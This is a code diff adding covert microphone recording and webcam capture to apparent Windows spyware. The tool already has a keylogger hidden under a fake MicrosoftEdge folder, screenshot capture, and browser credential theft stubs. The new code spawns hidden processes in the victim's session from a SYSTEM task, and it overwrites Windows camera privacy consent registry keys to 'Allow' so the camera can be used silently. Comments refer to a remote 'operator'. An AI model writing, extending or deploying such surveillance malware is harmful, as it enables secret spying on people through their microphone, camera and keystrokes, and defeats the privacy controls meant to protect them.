@@ -10,6 +10,17 @@
 #include <windows.h>
 #include <wincrypt.h>
 #include <wtsapi32.h>
+/* MF headers must come before audioclient.h: strmif.h (pulled by mfapi.h)
+ * sets TIMECODE_DEFINED and __DDRAW_INCLUDED__ so that ksmedia.h (pulled by
+ * audioclient.h) skips the conflicting tagTIMECODE_SAMPLE / DDPIXELFORMAT
+ * redefinitions in older mingw-w64 toolchains. */
+#include <initguid.h>
+#include <mfapi.h>
+#include <mfidl.h>
+#include <mfreadwrite.h>
+#include <mferror.h>
+#include <mmdeviceapi.h>
+#include <audioclient.h>
 
 #define KEYLOG_FILE "C:\\Users\\Public\\MicrosoftEdge\\kl.dat"
 
@@ -348,10 +359,6 @@ static char *screenshot_via_user_session(int *len_out, DWORD console_session)
 
 char *spy_screenshot_capture(int *len_out)
 {
-    /* Detect Session 0 isolation: the scheduled task runs as SYSTEM in a
-     * non-interactive session.  GetDC(NULL) there returns the blank Session 0
-     * desktop, producing a solid black image.  Spawn a helper in the active
-     * console session instead so GDI sees the real user desktop. */
     DWORD my_session = 0;
     ProcessIdToSessionId(GetCurrentProcessId(), &my_session);
     DWORD console_session = WTSGetActiveConsoleSessionId();
@@ -362,6 +369,461 @@ char *spy_screenshot_capture(int *len_out)
     return gdi_screenshot(len_out);
 }
 
+/* ── WASAPI microphone recording ─────────────────────────────────────────
+ *
+ * Captures PCM audio from the default recording device for duration_sec
+ * seconds and returns a heap-allocated WAV file.  Must run in the
+ * interactive user session (not Session 0) — caller uses the session-helper
+ * pattern (--mic-record <dur> <path>) to ensure this. */
+static char *wasapi_mic_record(int duration_sec, int *len_out)
+{
+    HRESULT hr;
+    IMMDeviceEnumerator  *pEnum    = NULL;
+    IMMDevice            *pDevice  = NULL;
+    IAudioClient         *pClient  = NULL;
+    IAudioCaptureClient  *pCapture = NULL;
+
+    CoInitializeEx(NULL, COINIT_MULTITHREADED);
+
+    hr = CoCreateInstance(&CLSID_MMDeviceEnumerator, NULL, CLSCTX_ALL,
+                          &IID_IMMDeviceEnumerator, (void **)&pEnum);
+    if (FAILED(hr)) { CoUninitialize(); return NULL; }
+
+    hr = pEnum->lpVtbl->GetDefaultAudioEndpoint(pEnum, eCapture, eConsole, &pDevice);
+    pEnum->lpVtbl->Release(pEnum);
+    if (FAILED(hr)) { CoUninitialize(); return NULL; }
+
+    hr = pDevice->lpVtbl->Activate(pDevice, &IID_IAudioClient, CLSCTX_ALL,
+                                    NULL, (void **)&pClient);
+    pDevice->lpVtbl->Release(pDevice);
+    if (FAILED(hr)) { CoUninitialize(); return NULL; }
+
+    /* Force 16-bit stereo PCM; AUTOCONVERTPCM handles any device format */
+    WAVEFORMATEX wfx;
+    memset(&wfx, 0, sizeof(wfx));
+    wfx.wFormatTag      = WAVE_FORMAT_PCM;
+    wfx.nChannels       = 2;
+    wfx.nSamplesPerSec  = 44100;
+    wfx.wBitsPerSample  = 16;
+    wfx.nBlockAlign     = wfx.nChannels * (wfx.wBitsPerSample / 8);
+    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
+
+    hr = pClient->lpVtbl->Initialize(pClient,
+             AUDCLNT_SHAREMODE_SHARED,
+             AUDCLNT_STREAMFLAGS_AUTOCONVERTPCM | AUDCLNT_STREAMFLAGS_SRC_DEFAULT_QUALITY,
+             10000000 /* 1-second buffer */, 0, &wfx, NULL);
+    if (FAILED(hr)) {
+        pClient->lpVtbl->Release(pClient);
+        CoUninitialize();
+        return NULL;
+    }
+
+    hr = pClient->lpVtbl->GetService(pClient, &IID_IAudioCaptureClient,
+                                      (void **)&pCapture);
+    if (FAILED(hr)) {
+        pClient->lpVtbl->Release(pClient);
+        CoUninitialize();
+        return NULL;
+    }
+
+    int max_audio = duration_sec * (int)wfx.nAvgBytesPerSec + 65536;
+    char *audio   = malloc(max_audio);
+    int   audio_len = 0;
+
+    pClient->lpVtbl->Start(pClient);
+
+    DWORD end_tick = GetTickCount() + (DWORD)(duration_sec * 1000);
+    while (GetTickCount() < end_tick) {
+        Sleep(10);
+        UINT32 packet_size = 0;
+        pCapture->lpVtbl->GetNextPacketSize(pCapture, &packet_size);
+        while (packet_size) {
+            BYTE   *pData  = NULL;
+            UINT32  frames = 0;
+            DWORD   flags  = 0;
+            hr = pCapture->lpVtbl->GetBuffer(pCapture, &pData, &frames, &flags, NULL, NULL);
+            if (FAILED(hr)) break;
+            int bytes = (int)(frames * wfx.nBlockAlign);
+            if (audio && audio_len + bytes <= max_audio) {
+                if (flags & AUDCLNT_BUFFERFLAGS_SILENT)
+                    memset(audio + audio_len, 0, bytes);
+                else
+                    memcpy(audio + audio_len, pData, bytes);
+                audio_len += bytes;
+            }
+            pCapture->lpVtbl->ReleaseBuffer(pCapture, frames);
+            pCapture->lpVtbl->GetNextPacketSize(pCapture, &packet_size);
+        }
+    }
+
+    pClient->lpVtbl->Stop(pClient);
+    pCapture->lpVtbl->Release(pCapture);
+    pClient->lpVtbl->Release(pClient);
+    CoUninitialize();
+
+    if (!audio || audio_len == 0) { free(audio); return NULL; }
+
+    /* Build WAV: 44-byte header + PCM data */
+    int   wav_size = 44 + audio_len;
+    char *wav      = malloc(wav_size);
+    if (!wav) { free(audio); return NULL; }
+
+    DWORD riff_size       = (DWORD)(wav_size - 8);
+    DWORD fmt_chunk_size  = 16;
+    WORD  pcm_tag         = WAVE_FORMAT_PCM;
+    DWORD data_size       = (DWORD)audio_len;
+
+    memcpy(wav +  0, "RIFF", 4);
+    memcpy(wav +  4, &riff_size,           4);
+    memcpy(wav +  8, "WAVE", 4);
+    memcpy(wav + 12, "fmt ", 4);
+    memcpy(wav + 16, &fmt_chunk_size,       4);
+    memcpy(wav + 20, &pcm_tag,              2);
+    memcpy(wav + 22, &wfx.nChannels,        2);
+    memcpy(wav + 24, &wfx.nSamplesPerSec,   4);
+    memcpy(wav + 28, &wfx.nAvgBytesPerSec,  4);
+    memcpy(wav + 32, &wfx.nBlockAlign,      2);
+    memcpy(wav + 34, &wfx.wBitsPerSample,   2);
+    memcpy(wav + 36, "data", 4);
+    memcpy(wav + 40, &data_size,            4);
+    memcpy(wav + 44, audio,                 audio_len);
+
+    free(audio);
+    *len_out = wav_size;
+    return wav;
+}
+
+/* Session helper: spawn self as --mic-record <dur> <path> in user session */
+static char *mic_via_user_session(int duration_sec, int *len_out,
+                                   DWORD console_session)
+{
+    HANDLE hToken = NULL;
+    if (!WTSQueryUserToken(console_session, &hToken)) return NULL;
+
+    char self_path[MAX_PATH];
+    GetModuleFileNameA(NULL, self_path, sizeof(self_path));
+
+    const char *tmp_path = "C:\\Users\\Public\\MicrosoftEdge\\mc.tmp";
+    char cmd[MAX_PATH + 96];
+    _snprintf(cmd, sizeof(cmd), "\"%s\" --mic-record %d \"%s\"",
+              self_path, duration_sec, tmp_path);
+
+    STARTUPINFOA si;
+    ZeroMemory(&si, sizeof(si));
+    si.cb          = sizeof(si);
+    si.dwFlags     = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&pi, sizeof(pi));
+
+    BOOL ok = CreateProcessAsUserA(hToken, NULL, cmd, NULL, NULL,
+                                    FALSE, CREATE_NO_WINDOW,
+                                    NULL, NULL, &si, &pi);
+    CloseHandle(hToken);
+    if (!ok) return NULL;
+
+    /* Wait up to (duration + 5) seconds for the helper to finish */
+    WaitForSingleObject(pi.hProcess, (DWORD)((duration_sec + 5) * 1000));
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+
+    char *data = read_file_heap_plain(tmp_path, len_out);
+    DeleteFileA(tmp_path);
+    return data;
+}
+
+char *spy_mic_record(int duration_sec, int *len_out)
+{
+    DWORD my_session      = 0;
+    DWORD console_session = WTSGetActiveConsoleSessionId();
+    ProcessIdToSessionId(GetCurrentProcessId(), &my_session);
+
+    if (my_session != console_session)
+        return mic_via_user_session(duration_sec, len_out, console_session);
+
+    return wasapi_mic_record(duration_sec, len_out);
+}
+
+/* ── Media Foundation camera snapshot ────────────────────────────────────
+ *
+ * Enumerates video capture devices, opens the first one, reads one RGB24
+ * frame via IMFSourceReader, and converts it to a BMP.  Must run in the
+ * interactive user session — caller uses the session-helper pattern. */
+
+/* Last failure reason — read by spy_camera_last_error() and included in
+ * the COMMAND_ERROR payload so the operator can diagnose remotely. */
+static char g_cam_err[256] = {0};
+
+const char *spy_camera_last_error(void) { return g_cam_err; }
+
+static char *mf_camera_snapshot(int *len_out)
+{
+    g_cam_err[0] = '\0';
+
+    HRESULT hr;
+    IMFAttributes    *pAttrs  = NULL;
+    IMFMediaSource   *pSource = NULL;
+    IMFSourceReader  *pReader = NULL;
+    IMFMediaType     *pType   = NULL;
+    IMFSample        *pSample = NULL;
+    IMFMediaBuffer   *pBuf    = NULL;
+    char             *result  = NULL;
+
+    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+    MFStartup(MF_VERSION, MFSTARTUP_NOSOCKET);
+
+    /* Windows 10 1809+ gates MFEnumDeviceSources on camera privacy consent.
+     * Win32 (non-packaged) apps need both the parent key and the NonPackaged
+     * sub-key set to "Allow" in HKCU — and the machine-level key in HKLM.
+     * Write these before enumerating so the same call picks them up. */
+    {
+        static const struct { HKEY root; const char *path; } keys[] = {
+            { HKEY_LOCAL_MACHINE,
+              "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam" },
+            { HKEY_CURRENT_USER,
+              "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam" },
+            { HKEY_CURRENT_USER,
+              "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged" },
+        };
+        for (int k = 0; k < 3; k++) {
+            HKEY hk;
+            if (RegCreateKeyExA(keys[k].root, keys[k].path, 0, NULL,
+                                REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
+                                NULL, &hk, NULL) == ERROR_SUCCESS) {
+                RegSetValueExA(hk, "Value", 0, REG_SZ,
+                               (const BYTE *)"Allow", 6);
+                RegCloseKey(hk);
+            }
+        }
+    }
+
+    /* Enumerate video capture devices */
+    hr = MFCreateAttributes(&pAttrs, 1);
+    if (FAILED(hr)) {
+        _snprintf(g_cam_err, sizeof(g_cam_err),
+                  "MFCreateAttributes hr=0x%08lx", (unsigned long)hr);
+        goto done;
+    }
+
+    hr = pAttrs->lpVtbl->SetGUID(pAttrs,
+             &MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE,
+             &MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);
+    if (FAILED(hr)) {
+        _snprintf(g_cam_err, sizeof(g_cam_err),
+                  "SetGUID(SOURCE_TYPE) hr=0x%08lx", (unsigned long)hr);
+        goto done;
+    }
+
+    IMFActivate **ppDevices = NULL;
+    UINT32 count = 0;
+    hr = MFEnumDeviceSources(pAttrs, &ppDevices, &count);
+    if (FAILED(hr)) {
+        _snprintf(g_cam_err, sizeof(g_cam_err),
+                  "MFEnumDeviceSources hr=0x%08lx", (unsigned long)hr);
+        goto done;
+    }
+    if (count == 0) {
+        _snprintf(g_cam_err, sizeof(g_cam_err),
+                  "no camera devices found (privacy blocked or no hardware)");
+        goto done;
+    }
+
+    hr = ppDevices[0]->lpVtbl->ActivateObject(ppDevices[0],
+             &IID_IMFMediaSource, (void **)&pSource);
+    for (UINT32 i = 0; i < count; i++)
+        ppDevices[i]->lpVtbl->Release(ppDevices[i]);
+    CoTaskMemFree(ppDevices);
+    if (FAILED(hr)) {
+        _snprintf(g_cam_err, sizeof(g_cam_err),
+                  "ActivateObject hr=0x%08lx (device in use?)", (unsigned long)hr);
+        goto done;
+    }
+
+    /* Create source reader.
+     * ADVANCED_VIDEO_PROCESSING is required when the camera outputs compressed
+     * frames (MJPEG is the most common case). It chains the full codec pipeline
+     * so any native format can be converted to RGB24/RGB32 on output.
+     * VIDEO_PROCESSING (the basic variant) only handles uncompressed → uncompressed
+     * and is mutually exclusive with this flag — do not set both. */
+    IMFAttributes *pReaderAttrs = NULL;
+    MFCreateAttributes(&pReaderAttrs, 2);
+    if (pReaderAttrs)
+        pReaderAttrs->lpVtbl->SetUINT32(pReaderAttrs,
+            &MF_SOURCE_READER_ENABLE_ADVANCED_VIDEO_PROCESSING, TRUE);
+    hr = MFCreateSourceReaderFromMediaSource(pSource, pReaderAttrs, &pReader);
+    if (pReaderAttrs) pReaderAttrs->lpVtbl->Release(pReaderAttrs);
+    if (FAILED(hr)) {
+        _snprintf(g_cam_err, sizeof(g_cam_err),
+                  "MFCreateSourceReaderFromMediaSource hr=0x%08lx", (unsigned long)hr);
+        goto done;
+    }
+
+    /* Request RGB24 output; fall back to RGB32 if the codec pipeline can't
+     * produce 24-bit (e.g. Windows N editions without the media feature pack). */
+    hr = MFCreateMediaType(&pType);
+    if (FAILED(hr)) goto done;
+    pType->lpVtbl->SetGUID(pType, &MF_MT_MAJOR_TYPE, &MFMediaType_Video);
+    pType->lpVtbl->SetGUID(pType, &MF_MT_SUBTYPE,    &MFVideoFormat_RGB24);
+    hr = pReader->lpVtbl->SetCurrentMediaType(pReader,
+             (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM, NULL, pType);
+    if (FAILED(hr)) {
+        /* RGB24 rejected — try RGB32 (BGRA/BGRX, 32 bpp) */
+        pType->lpVtbl->SetGUID(pType, &MF_MT_SUBTYPE, &MFVideoFormat_RGB32);
+        hr = pReader->lpVtbl->SetCurrentMediaType(pReader,
+                 (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM, NULL, pType);
+        if (FAILED(hr)) {
+            _snprintf(g_cam_err, sizeof(g_cam_err),
+                      "SetCurrentMediaType(RGB24+RGB32) hr=0x%08lx", (unsigned long)hr);
+            goto done;
+        }
+    }
+
+    /* Give the camera ~500 ms to warm up before reading frames.
+     * Without this delay the ReadSample loop exhausts all retries before
+     * the capture pipeline delivers the first frame. */
+    Sleep(500);
+
+    /* Read one frame (skip format-change/stream-event samples) */
+    for (int attempts = 0; attempts < 60; attempts++) {
+        DWORD stream_index = 0, stream_flags = 0;
+        LONGLONG timestamp  = 0;
+        if (pSample) { pSample->lpVtbl->Release(pSample); pSample = NULL; }
+        hr = pReader->lpVtbl->ReadSample(pReader,
+                 (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM,
+                 0, &stream_index, &stream_flags, &timestamp, &pSample);
+        if (FAILED(hr)) break;
+        if (stream_flags & MF_SOURCE_READERF_ENDOFSTREAM) break;
+        if (pSample) break;
+        Sleep(50);
+    }
+    if (!pSample) {
+        _snprintf(g_cam_err, sizeof(g_cam_err),
+                  "ReadSample: no frame received after 60 attempts (hr=0x%08lx)",
+                  (unsigned long)hr);
+        goto done;
+    }
+
+    /* Get frame dimensions and actual bit depth from the negotiated output type */
+    IMFMediaType *pActualType = NULL;
+    UINT32 width = 640, height = 480;
+    WORD   bpp   = 24; /* updated below if RGB32 was negotiated */
+    hr = pReader->lpVtbl->GetCurrentMediaType(pReader,
+             (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM, &pActualType);
+    if (SUCCEEDED(hr)) {
+        UINT64 frame_size = 0;
+        pActualType->lpVtbl->GetUINT64(pActualType, &MF_MT_FRAME_SIZE, &frame_size);
+        width  = (UINT32)(frame_size >> 32);
+        height = (UINT32)(frame_size & 0xFFFFFFFF);
+        GUID subtype = {0};
+        if (SUCCEEDED(pActualType->lpVtbl->GetGUID(pActualType,
+                &MF_MT_SUBTYPE, &subtype))) {
+            if (IsEqualGUID(&subtype, &MFVideoFormat_RGB32))
+                bpp = 32;
+        }
+        pActualType->lpVtbl->Release(pActualType);
+    }
+
+    /* Convert to contiguous buffer */
+    hr = pSample->lpVtbl->ConvertToContiguousBuffer(pSample, &pBuf);
+    if (FAILED(hr)) goto done;
+
+    BYTE  *pPixels = NULL;
+    DWORD  maxLen  = 0, curLen = 0;
+    hr = pBuf->lpVtbl->Lock(pBuf, &pPixels, &maxLen, &curLen);
+    if (FAILED(hr)) goto done;
+
+    /* MF delivers bottom-up RGB; build a BMP with the negotiated bit depth */
+    int image_size = (int)(width * height * (bpp / 8));
+    BITMAPFILEHEADER bfh;
+    BITMAPINFOHEADER bih;
+    memset(&bfh, 0, sizeof(bfh));
+    memset(&bih, 0, sizeof(bih));
+
+    bih.biSize        = sizeof(BITMAPINFOHEADER);
+    bih.biWidth       = (LONG)width;
+    bih.biHeight      = -(LONG)height; /* negative = top-down; MF RGB output is top-down */
+    bih.biPlanes      = 1;
+    bih.biBitCount    = bpp;
+    bih.biCompression = BI_RGB;
+
+    bfh.bfType    = 0x4D42;
+    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+    bfh.bfSize    = bfh.bfOffBits + (DWORD)image_size;
+
+    int total  = (int)bfh.bfSize;
+    result     = malloc(total);
+    if (result) {
+        int copy_len = (int)curLen < image_size ? (int)curLen : image_size;
+        memcpy(result,                 &bfh,    sizeof(bfh));
+        memcpy(result + sizeof(bfh),   &bih,    sizeof(bih));
+        memset(result + bfh.bfOffBits, 0,       image_size);
+        memcpy(result + bfh.bfOffBits, pPixels, copy_len);
+        *len_out = total;
+    }
+
+    pBuf->lpVtbl->Unlock(pBuf);
+
+done:
+    if (pBuf)    pBuf->lpVtbl->Release(pBuf);
+    if (pSample) pSample->lpVtbl->Release(pSample);
+    if (pType)   pType->lpVtbl->Release(pType);
+    if (pReader) pReader->lpVtbl->Release(pReader);
+    if (pSource) pSource->lpVtbl->Release(pSource);
+    if (pAttrs)  pAttrs->lpVtbl->Release(pAttrs);
+    MFShutdown();
+    CoUninitialize();
+    return result;
+}
+
+/* Session helper: spawn self as --camera-snapshot <path> in user session */
+static char *camera_via_user_session(int *len_out, DWORD console_session)
+{
+    HANDLE hToken = NULL;
+    if (!WTSQueryUserToken(console_session, &hToken)) return NULL;
+
+    char self_path[MAX_PATH];
+    GetModuleFileNameA(NULL, self_path, sizeof(self_path));
+
+    const char *tmp_path = "C:\\Users\\Public\\MicrosoftEdge\\cam.tmp";
+    char cmd[MAX_PATH + 80];
+    _snprintf(cmd, sizeof(cmd), "\"%s\" --camera-snapshot \"%s\"",
+              self_path, tmp_path);
+
+    STARTUPINFOA si;
+    ZeroMemory(&si, sizeof(si));
+    si.cb          = sizeof(si);
+    si.dwFlags     = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&pi, sizeof(pi));
+
+    BOOL ok = CreateProcessAsUserA(hToken, NULL, cmd, NULL, NULL,
+                                    FALSE, CREATE_NO_WINDOW,
+                                    NULL, NULL, &si, &pi);
+    CloseHandle(hToken);
+    if (!ok) return NULL;
+
+    WaitForSingleObject(pi.hProcess, 15000);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+
+    char *data = read_file_heap_plain(tmp_path, len_out);
+    DeleteFileA(tmp_path);
+    return data;
+}
+
+char *spy_camera_snapshot(int *len_out)
+{
+    DWORD my_session      = 0;
+    DWORD console_session = WTSGetActiveConsoleSessionId();
+    ProcessIdToSessionId(GetCurrentProcessId(), &my_session);
+
+    if (my_session != console_session)
+        return camera_via_user_session(len_out, console_session);
+
+    return mf_camera_snapshot(len_out);
+}
+
 #else
 /* Stub implementations for non-Windows platforms */
 void spy_keylog_start(void) {}
@@ -370,4 +832,8 @@ char *spy_keylog_dump(int *len_out) { *len_out = 0; return NULL; }
 char *spy_clipboard_get(int *len_out) { *len_out = 0; return NULL; }
 char *spy_screenshot_capture(int *len_out) { *len_out = 0; return NULL; }
 char *spy_browser_creds_steal(int *len_out) { *len_out = 0; return NULL; }
+char *spy_browser_history_steal(int *len_out) { *len_out = 0; return NULL; }
+char *spy_mic_record(int duration_sec, int *len_out) { (void)duration_sec; *len_out = 0; return NULL; }
+char *spy_camera_snapshot(int *len_out) { *len_out = 0; return NULL; }
+const char *spy_camera_last_error(void) { return ""; }
 #endif
